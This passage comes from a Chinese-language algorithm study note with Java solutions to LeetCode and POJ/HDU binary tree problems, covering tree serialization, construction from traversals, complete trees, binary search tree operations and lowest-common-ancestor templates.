TreeNode(Integer.valueOf(nodes[i]));\n      if (child != null) {\n        queue.add(child);\n      }\n      currentNode.right = child;\n    }\n    return root;\n  }\n}\n```\n\n#### 方法二：先序遍历\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\npublic class Codec {\n\n  // Encodes a tree to a single string.\n  public String serialize(TreeNode root) {\n    if (root == null) return \"#\";\n    StringBuffer sb = new StringBuffer();\n    return sb.append(root.val).append(\",\").append(serialize(root.left)).append(\",\").append(serialize(root.right)).toString();\n  }\n\n  // Decodes your encoded data to tree.\n  public TreeNode deserialize(String data) {\n    Queue<String> queue = new LinkedList(Arrays.asList(data.split(\",\"))); \n    return helper(queue);\n  }\n\n  TreeNode helper(Queue<String> queue) {\n    String current = queue.poll();\n    if (current.equals(\"#\")) return null;\n    TreeNode currentNode = new TreeNode(Integer.valueOf(current));\n    currentNode.left = helper(queue);\n    currentNode.right = helper(queue);\n    return currentNode;\n  }\n}\n```\n\n### 例题2: 前序遍历构造二叉搜索树\n[前序遍历构造二叉搜索树](https://leetcode.cn/problems/construct-binary-search-tree-from-preorder-traversal/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726153602.png)\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int[] preorder;\n  int index = 0;\n  public TreeNode bstFromPreorder(int[] preorder) {\n    this.preorder = preorder;\n    return helper(Integer.MIN_VALUE, Integer.MAX_VALUE);\n  }\n  \n  TreeNode helper(int lower, int upper) {\n    if (index == preorder.length) return null;\n    int val = preorder[index];\n    if (val < lower || val > upper) return null; \n    index++;\n    TreeNode node = new TreeNode(val);\n    node.left = helper(lower, val); \n    node.right = helper(val, upper); \n    return node;\n  }\n}\n```\n\n### 例题3: 从前序与中序遍历序列构造二叉树\n[从前序与中序遍历序列构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-inorder-traversal/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726162709.png)\n\n#### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/A3nsjkhlj2s\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int[] preorder, inorder;\n  public TreeNode buildTree(int[] preorder, int[] inorder) {\n    this.preorder = preorder;\n    this.inorder = inorder;\n    return helper(0, 0, inorder.length - 1);\n  }\n  \n  TreeNode helper(int preStart, int inStart, int inEnd) {\n    if (inStart > inEnd) return null;\n    int val = preorder[preStart];\n    TreeNode node = new TreeNode(val);\n    int inIndex = 0;\n    for (int i = inStart; i <= inEnd; i++) {\n      if (inorder[i] == val) {\n        inIndex = i;\n      }\n    }\n    int size = inIndex - inStart;\n    node.left = helper(preStart + 1, inStart, inIndex - 1);\n    node.right = helper(preStart + size + 1, inIndex + 1, inEnd);\n    return node;\n  }\n\n}\n```\n\n### 例题4: 从中序与后序遍历序列构造二叉树\n[从中序与后序遍历序列构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-inorder-and-postorder-traversal/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726165511.png)\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int[] inorder;\n  int[] postorder;\n  public TreeNode buildTree(int[] inorder, int[] postorder) {\n    this.inorder = inorder;\n    this.postorder = postorder;\n    return helper(postorder.length - 1 , 0, inorder.length - 1);\n  }\n\n  TreeNode helper(int postStart, int inStart, int inEnd) {\n    if (inStart > inEnd) return null;\n    int val = postorder[postStart];\n    TreeNode node = new TreeNode(val);\n    int inIndex = 0;\n    for (int i = inStart; i <= inEnd; i++) {\n      if (inorder[i] == val) {\n        inIndex = i;\n      }\n    }\n    int size = inEnd - inIndex;\n    node.right = helper(postStart - 1, inIndex + 1, inEnd);\n    node.left = helper(postStart - size - 1, inStart, inIndex -1);\n    return node;\n  }\n\n}\n```\n\n### 例题5: 根据前序和后序遍历构造二叉树\n[根据前序和后序遍历构造二叉树](https://leetcode.cn/problems/construct-binary-tree-from-preorder-and-postorder-traversal/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726191753.png)\n\n基本思路：preorder左子树第一个孩子，就是postorder左子树的最后一个孩子\n\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  int[] preorder, postorder;\n  int n;\n  Map<Integer, Integer> map = new HashMap();\n  public TreeNode constructFromPrePost(int[] preorder, int[] postorder) {\n    this.preorder = preorder;\n    this.postorder = postorder;\n    n = preorder.length;\n    for (int i = 0; i < n; i++) {\n      map.put(postorder[i], i);\n    }\n    return helper(0, 0, n - 1);\n  }\n  \n  TreeNode helper(int preStart, int postStart, int postEnd) {\n    if (preStart > n || postStart > postEnd) return null;\n    TreeNode node = new TreeNode(preorder[preStart++]);\n    if (preStart == n || postStart == postEnd) return node;\n    int postIndex = map.get(preorder[preStart]);\n    node.left = helper(preStart, postStart, postIndex);\n    node.right = helper(preStart + postIndex - postStart + 1, postIndex + 1, postEnd - 1);\n    return node;\n  }\n}\n```\n\n\n## 完全二叉树\n### 例题1: 完全二叉树插入器\n[完全二叉树插入器](https://leetcode.cn/problems/complete-binary-tree-inserter/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220725143911.png)\n\n#### 分析 \n参考引用：https://leetcode.cn/problems/complete-binary-tree-inserter/solution/wan-quan-er-cha-shu-cha-ru-qi-by-leetcod-lf8t/\n\n对于一棵完全二叉树而言，其除了最后一层之外都是完全填充的，并且最后一层的节点全部在最左侧。那么，只有倒数第二层（如果存在）最右侧的若干个节点，以及最后一层的全部节点可以再添加子节点，其余的节点都已经拥有两个子节点。\n\n因此，我们可以使用一个队列存储上述提到的这些可以添加子节点的节点。队列中的存储顺序为：首先「从左往右」存储倒数第二层最右侧的节点，再「从左往右」存储最后一层的全部节点。这一步可以使用广度优先搜索来完成，因为广度优先搜索就是按照层优先进行遍历的。\n\n随后，当我们每次调用 insert(val) 时，我们就创建出一个节点 child，并将它最为队列的队首节点的子节点。在这之后，我们需要把child加入队尾，并且如果对队首节点已经有两个子节点，我们需要将其从队列中移除。\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass CBTInserter {\n  \n  Queue<TreeNode> candidate = new LinkedList();\n  TreeNode root;\n\n  public CBTInserter(TreeNode root) {\n    this.root = root;\n    Queue<TreeNode> queue = new LinkedList();\n    queue.add(root);\n    \n    while (!queue.isEmpty()) {\n      TreeNode currentNode = queue.poll();\n      if (currentNode.left != null) {\n        queue.add(currentNode.left);\n      }\n      if (currentNode.right != null) {\n        queue.add(currentNode.right);\n      }\n      if (currentNode.left == null || currentNode.right == null) {\n        candidate.add(currentNode);\n      }\n    }\n\n  }\n  \n  public int insert(int val) {\n    TreeNode currentNode = candidate.peek();\n    TreeNode newNode = new TreeNode(val);\n    if (currentNode.left == null) {\n      currentNode.left = newNode;\n    } else if (currentNode.right == null) {\n      currentNode.right = newNode;\n      candidate.poll();\n    }\n    candidate.add(newNode);\n    return currentNode.val;\n  }\n  \n  public TreeNode get_root() {\n    return root;\n  }\n}\n```\n\n### 例题2: 完全二叉树的节点个数\n[完全二叉树的节点个数](https://leetcode.cn/problems/count-complete-tree-nodes/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220725153009.png)\n\n#### 分析\n- 参考链接：https://labuladong.github.io/algo/2/21/48/\n\n如何求一棵完全二叉树的节点个数呢？如果是一个普通二叉树，显然只要向下面这样遍历一边即可，时间复杂度 O(N)：\n```java\npublic int countNodes(TreeNode root) {\n    if (root == null) return 0;\n    return 1 + countNodes(root.left) + countNodes(root.right);\n}\n```\n那如果是一棵满二叉树，节点总数就和树的高度呈指数关系：\n```java\npublic int countNodes(TreeNode root) {\n    int h = 0;\n    // 计算树的高度\n    while (root != null) {\n        root = root.left;\n        h++;\n    }\n    // 节点总数就是 2^h - 1\n    return (int)Math.pow(2, h) - 1;\n}\n```\n完全二叉树比普通二叉树特殊，但又没有满二叉树那么特殊，计算它的节点总数，可以说是普通二叉树和完全二叉树的结合版，先看代码：\n```java\npublic int countNodes(TreeNode root) {\n    TreeNode l = root, r = root;\n    // 沿最左侧和最右侧分别计算高度\n    int hl = 0, hr = 0;\n    while (l != null) {\n        l = l.left;\n        hl++;\n    }\n    while (r != null) {\n        r = r.right;\n        hr++;\n    }\n    // 如果左右侧计算的高度相同，则是一棵满二叉树\n    if (hl == hr) {\n        return (int)Math.pow(2, hl) - 1;\n    }\n    // 如果左右侧的高度不同，则按照普通二叉树的逻辑计算\n    return 1 + countNodes(root.left) + countNodes(root.right);\n}\n```\n\n#### 复杂度分析\n这个算法的时间复杂度是`O(logN*logN)`，这是怎么算出来的呢？\n\n直觉感觉好像最坏情况下是 `O(N*logN)` 吧，因为之前的 while 需要 logN 的时间，最后要 O(N) 的时间向左右子树递归：\n```java\nreturn 1 + countNodes(root.left) + countNodes(root.right);\n```\n关键点在于，这两个递归只有一个会真的递归下去，另一个一定会触发 `hl == hr` 而立即返回，不会递归下去。\n\n为什么呢？原因如下：\n\n**一棵完全二叉树的两棵子树，至少有一棵是满二叉树：**\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220725153405.png)\n\n看图就明显了吧，由于完全二叉树的性质，其子树一定有一棵是满的，所以一定会触发 `hl == hr`，只消耗 `O(logN)` 的复杂度而不会继续递归。\n\n综上，算法的递归深度就是树的高度 `O(logN)`，每次递归所花费的时间就是 while 循环，需要 `O(logN)`，所以总体的时间复杂度是 `O(logN*logN)`。\n\n所以说，「完全二叉树」这个概念还是有它存在的原因的，不仅适用于数组实现二叉堆，而且连计算节点总数这种看起来简单的操作都有高效的算法实现。\n\n## 二叉搜索树\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1tepmYvCdcaZCt1YVoLi4pcJd30dNTaND/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n### 例题1: 二叉搜索树中第K小的元素\n[二叉搜索树中第K小的元素](https://leetcode.cn/problems/kth-smallest-element-in-a-bst/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727102955.png)\n\n代码：\n```java\nclass Solution {\n  int ans = 0;\n  int k = 0;\n  public int kthSmallest(TreeNode root, int k) {\n    this.k = k;\n    dfs(root);\n    return ans;\n  }\n\n  void dfs(TreeNode root) {\n    if (root == null) return;\n    dfs(root.left);\n    k--;\n    if (k == 0) {\n      ans = root.val; \n      return;\n    }\n    dfs(root.right);\n  }\n}\n```\n\n### 例题2: 把二叉搜索树转换为累加树\n[把二叉搜索树转换为累加树](https://leetcode.cn/problems/convert-bst-to-greater-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727103830.png)\n\n代码：\n```java\nclass Solution {\n  int sum = 0;\n  public TreeNode convertBST(TreeNode root) {\n    traversal(root);\n    return root;\n  }\n\n  void traversal(TreeNode root) {\n    if (root == null) return;\n    traversal(root.right);\n    sum += root.val;\n    root.val = sum;\n    traversal(root.left);\n  }\n  \n}\n```\n\n### 例题3: 二叉搜索树中的搜索\n[二叉搜索树中的搜索](https://leetcode.cn/problems/search-in-a-binary-search-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727113221.png)\n\n这题可以看成隐式图上的DFS算法，直接套模版\n\n代码：\n```java\nclass Solution {\n  public TreeNode searchBST(TreeNode root, int val) {\n    if (root.val == val) return root;\n    List<TreeNode> nextNodes = new ArrayList();\n    if (root.left != null) {\n      nextNodes.add(root.left);\n    }\n    if (root.right != null) {\n      nextNodes.add(root.right);\n    }\n    for (TreeNode nextNode : nextNodes) {\n      TreeNode temp = searchBST(nextNode, val);\n      if (temp != null) return temp;\n    }\n    return null;\n  }\n}\n```\n\n### 例题4: 删除二叉搜索树中的节点\n[删除二叉搜索树中的节点](https://leetcode.cn/problems/delete-node-in-a-bst/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726222457.png)\n\n#### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/2hahrf3K8o4\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode() {}\n *     TreeNode(int val) { this.val = val; }\n *     TreeNode(int val, TreeNode left, TreeNode right) {\n *         this.val = val;\n *         this.left = left;\n *         this.right = right;\n *     }\n * }\n */\nclass Solution {\n  // 该函数的功能：返回删除指定节点后的树的根节点\n  public TreeNode deleteNode(TreeNode root, int key) {\n    if (root == null) return null; \n    if (root.val > key) root.left = deleteNode(root.left, key);\n    else if (root.val < key) root.right = deleteNode(root.right, key);\n    else if (root.left == null) return root.right;\n    else if (root.right == null) return root.left;\n    else {\n      root.val = getMin(root.right);\n      root.right = deleteNode(root.right, root.val);\n    }\n    return root;\n  }\n\n  int getMin(TreeNode node) {\n    while (node.left != null) node = node.left;\n    return node.val;\n  }\n}\n```\n\n### 例题5: 验证二叉搜索树\n[验证二叉搜索树](https://leetcode.cn/problems/validate-binary-search-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727093717.png)\n\n代码：\n```java\nclass Solution {\n\n  public boolean isValidBST(TreeNode root) {\n    return isValidBST(root, Long.MAX_VALUE, Long.MIN_VALUE);\n  }\n\n  boolean isValidBST(TreeNode root, long max, long min) {\n    if (root == null) return true;\n    if (root.val <= min || root.val >= max) return false;\n    return isValidBST(root.left, root.val, min) && isValidBST(root.right, max, root.val);\n  }\n}\n```\n\n### 例题6: 二叉搜索树迭代器\n[二叉搜索树迭代器](https://leetcode.cn/problems/binary-search-tree-iterator/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727095401.png)\n\n#### 分析\n此题的难点在于只能使用O(h)内存。而解决方法就是用栈保存所有最左的节点\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727095542.png)\n\n代码：\n```java\nclass BSTIterator {\n\n  Stack<TreeNode> stack;\n\n  public BSTIterator(TreeNode root) {\n    stack = new Stack();\n    pushAllLeft(root);\n  }\n\n  void pushAllLeft(TreeNode node) {\n    while (node != null) {\n      stack.push(node);\n      node = node.left;\n    }\n  }\n  \n  public int next() {\n    TreeNode node = stack.pop();\n    pushAllLeft(node.right);\n    return node.val;\n  }\n  \n  public boolean hasNext() {\n    return !stack.isEmpty();\n  }\n}\n```\n\n### 例题7: 不同的二叉搜索树\n[不同的二叉搜索树](https://leetcode.cn/problems/unique-binary-search-trees/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727143858.png)\n\n#### 分析\n参考链接：\n- https://mp.weixin.qq.com/s/kcwz2lyRxxOsC3n11qdVSw\n- https://leetcode.cn/problems/unique-binary-search-trees/solution/bu-tong-de-er-cha-sou-suo-shu-by-leetcode-solution/\n\n给定一个有序序列`1...n`，为了构建出一棵二叉搜索树，我们可以遍历每个数字i，将该数字作为树根，将`1...(i−1)` 序列作为左子树，将 `(i+1)...n` 序列作为右子树。接着我们可以按照同样的方式递归构建左子树和右子树。\n\n在上述构建的过程中，由于根的值不同，因此我们能保证每棵二叉搜索树是唯一的。\n\n由此可见，原问题可以分解成规模较小的两个子问题，且子问题的解可以复用。因此，我们可以想到使用分治法来求解本题。\n\n状态：`dp[i,j]`: 表示闭区间[i, j]组成的BST个数\n\n代码：\n```java\nclass Solution {\n\n  public int numTrees(int n) {\n    return dfs(1, n);\n  }\n\n  int dfs(int i, int j) {\n    if (i >= j) return 1;\n    int res = 0;\n    for (int root = i; root <= j; root++) {\n      // root的值作为根节点的root\n      int leftCnt = dfs(i, root - 1);\n      int rightCnt= dfs(root + 1, j);\n      // 左右子树的组合数乘积是 BST 的总数\n      res += leftCnt * rightCnt;\n    }\n    return res;\n  }\n\n}\n```\n\n### 例题8: 不同的二叉搜索树 II\n[不同的二叉搜索树 II](https://leetcode.cn/problems/unique-binary-search-trees-ii/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220727150940.png)\n\n#### 分析\n参考链接：\n- https://mp.weixin.qq.com/s/kcwz2lyRxxOsC3n11qdVSw\n- https://leetcode.cn/problems/unique-binary-search-trees-ii/solution/bu-tong-de-er-cha-sou-suo-shu-ii-by-leetcode-solut/\n\n代码：\n```java\nclass Solution {\n\n  boolean[] visited;\n  public List<TreeNode> generateTrees(int n) {\n    return dfs(1, n);\n  }\n\n  List<TreeNode> dfs(int i, int j) {\n    List<TreeNode> res = new ArrayList();\n    if (i > j) {\n      res.add(null);\n      return res;\n    }\n    for (int root = i; root <= j; root++) {\n      List<TreeNode> leftTrees = dfs(i, root - 1);\n      List<TreeNode> rightTrees = dfs(root + 1, j);\n      for (TreeNode leftTree : leftTrees) {\n        for (TreeNode rightTree : rightTrees) {\n          TreeNode rootNode = new TreeNode(root);\n          rootNode.left = leftTree;\n          rootNode.right = rightTree;\n          res.add(rootNode);\n        }\n      }\n    }\n    return res;\n  }\n}\n```\n\n## 最近公共祖先LCA\n### 例题1: 二叉搜索树的最近公共祖先\n[二叉搜索树的最近公共祖先](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724203652.png)\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\n\nclass Solution {\n  public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n    if (root.val > p.val && root.val > q.val) return lowestCommonAncestor(root.left, p, q);\n    if (root.val < p.val && root.val < q.val) return lowestCommonAncestor(root.right, p, q);\n    return root;\n  }\n}\n```\n\n### 例题2: 二叉树的最近公共祖先\n[二叉树的最近公共祖先](https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-tree/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220724203747.png)\n\n代码：\n```java\n/**\n * Definition for a binary tree node.\n * public class TreeNode {\n *     int val;\n *     TreeNode left;\n *     TreeNode right;\n *     TreeNode(int x) { val = x; }\n * }\n */\nclass Solution {\n  // 在root为根的二叉树中找到A, B的LCA\n  // 如果找到了就返回这个LCA\n  // 如果只碰到A，就返回A\n  // 如果只碰到B，就返回B\n  // 如果没有，就返回null\n  public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {\n    if (root == null || p == root || q == root) return root;\n    TreeNode left = lowestCommonAncestor(root.left, p, q);\n    TreeNode right = lowestCommonAncestor(root.right, p, q);\n    if (left != null && right != null) return root;\n    if (left != null) return left;\n    if (right != null) return right;\n    return null;\n  }\n}\n```\n\n### 例题3: 最深叶节点的最近公共祖先\n[最深叶节点的最近公共祖先](https://leetcode.cn/problems/lowest-common-ancestor-of-deepest-leaves/)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220726202101.png)\n\n#### 分析\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/9zQHDE5wvbU\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n代码：\n```java\nclass Solution {\n  public TreeNode lcaDeepestLeaves(TreeNode root) {\n    return dfs(root, 0).getKey();\n  }\n\n  Map.Entry<TreeNode, Integer> dfs(TreeNode root, Integer height) {\n    if (root == null) return Map.entry(new TreeNode(-1), height);\n    Map.Entry<TreeNode, Integer> left = dfs(root.left, height + 1);\n    Map.Entry<TreeNode, Integer> right = dfs(root.right, height + 1);\n    if (left.getValue() == right.getValue()) {\n      return Map.entry(root, left.getValue());\n    }\n    return left.getValue() > right.getValue() ? left : right;\n  }\n}\n```\n\n### 倍增法求LCA\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/YFOcVHsBO78\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe src=\"https://drive.google.com/file/d/1S0TDNDZpNpNBsNZm0NBEgHEUTTa-7dcL/preview\" width=\"640\" height=\"480\" allow=\"autoplay\"></iframe>\n</div>\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/161vSYEqJVE\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n\n#### 只需要求两个节点的LCA\n##### 模版\n```java\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // 使用邻接表来存储树\n  List<Integer>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  /**\n   * @param root 树的根节点\n   */\n  public LCA(List<Integer>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 1];\n    }\n    // 遍历当前当前节点的子节点\n    for (int child : tree[v]) {\n      dep[child] = dep[v] + 1;\n      F[child][0] = v;\n      dfs(child);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n}\n```\n\n##### 例题1: Nearest Common Ancestors\n[Nearest Common Ancestors](http://poj.org/problem?id=1330)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220607152246.png)\n\n代码：\n```java\nint T = cin.nextInt();\n\npublic void solve() {\n  while (T-- != 0) {\n    int N = cin.nextInt();\n    List<Integer>[] tree = new List[N + 1];\n    for (int i = 1; i <= N; i++) {\n      tree[i] = new ArrayList();\n    }\n    // flag[i]==true表示有指向i节点的节点\n    boolean[] flag = new boolean[N + 1];\n    for (int i = 0; i < N - 1; i++) {\n      int a = cin.nextInt();\n      int b = cin.nextInt();\n      tree[a].add(b);\n      flag[b] = true;\n    }\n    // 查找tree的根节点\n    int root = -1;\n    for (int i = 1; i <= N; i++) {\n      if (!flag[i]) {\n        root = i;\n        break;\n      }\n    }\n    LCA lac = new LCA(tree, root);\n    int x = cin.nextInt();\n    int y = cin.nextInt();\n    System.out.println(lac.getLCA(x, y));\n  }\n}\n\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // 使用邻接表来存储树\n  List<Integer>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  /**\n   * @param root 树的根节点\n   */\n  public LCA(List<Integer>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 1];\n    }\n    // 遍历当前当前节点的子节点\n    for (int child : tree[v]) {\n      dep[child] = dep[v] + 1;\n      F[child][0] = v;\n      dfs(child);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n}\n\n}\n```\n\n#### 扩展成要求任何两点之间的距离\n##### 模版\n```java\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // dist[i]表示表示节点i到根节点的距离\n  int[] dist;\n  // 使用邻接表来存储树\n  List<int[]>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  public LCA(List<int[]>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    dist = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 1];\n    }\n    for (int[] child : tree[v]) {\n      dep[child[0]] = dep[v] + 1;\n      dist[child[0]] = dist[v] + child[1];\n      F[child[0]][0] = v;\n      dfs(child[0]);\n    }\n  }\n\n  /**\n   * 查询x节点与y节点的最近公共祖先\n   */\n  int getLCA(int x, int y) {\n    if (dep[x] < dep[y]) {\n      int temp = x;\n      x = y;\n      y = temp;\n    }\n    for (int i = k; i >= 0; i--) {\n      if (dep[F[x][i]] >= dep[y]) {\n        x = F[x][i];\n      }\n      if (x == y) {\n        return x;\n      }\n    }\n    for (int i = k; i >= 0; i--) {\n      if (F[x][i] != F[y][i]) {\n        x = F[x][i];\n        y = F[y][i];\n      }\n    }\n    return F[x][0];\n  }\n\n  /**\n   * 查询x节点与y节点的之间的距离\n   */\n  int getDist(int x, int y) {\n    int lac = getLCA(x, y);\n    return dist[x] + dist[y] - 2 * dist[lac];\n  }\n\n}\n```\n\n##### 例题1：How far away ？\n[How far away ？](http://acm.hdu.edu.cn/showproblem.php?pid=2586)\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220607165201.png)\n\n代码：\n```java\nint T = cin.nextInt();\n\npublic void solve() {\n  while (T-- != 0) {\n    int n = cin.nextInt();\n    int m = cin.nextInt();\n    List<int[]>[] tree = new List[n + 1];\n    for (int i = 1; i <= n; i++) {\n      tree[i] = new ArrayList<>();\n    }\n    // flag[i]==true表示有指向i节点的节点\n    boolean[] flag = new boolean[n + 1];\n    for (int i = 1; i < n; i++) {\n      int a = cin.nextInt();\n      int b = cin.nextInt();\n      int k = cin.nextInt();\n      tree[a].add(new int[]{b, k});\n      flag[b] = true;\n    }\n    // 查找tree的根节点\n    int root = -1;\n    for (int i = 1; i <= n; i++) {\n      if (!flag[i]) {\n        root = i;\n        break;\n      }\n    }\n    LCA lac = new LCA(tree, root);\n    while (m-- != 0) {\n      int x = cin.nextInt();\n      int y = cin.nextInt();\n      System.out.println(lac.getDist(x, y));\n    }\n  }\n}\n\nclass LCA {\n  // F[i][j]表示从i节点向上走2^j步\n  int F[][];\n  // 存储节点的深度\n  int[] dep;\n  // dist[i]表示表示节点i到根节点的距离\n  int[] dist;\n  // 使用邻接表来存储树\n  List<int[]>[] tree;\n  // 最多可以跳2^k步\n  int k;\n\n  public LCA(List<int[]>[] tree, Integer root) {\n    this.tree = tree;\n    int n = tree.length;\n    dep = new int[n];\n    dist = new int[n];\n    k = (int) (Math.log(n) / Math.log(2));\n    F = new int[n][k + 1];\n    // 初始化\n    dep[root] = 1;\n    dfs(root);\n  }\n\n  /**\n   * @param v 当前节点\n   */\n  void dfs(int v) {\n    for (int i = 1; (1 << i) <= dep[v]; i++) {\n      F[v][i] = F[F[v][i - 1]][i - 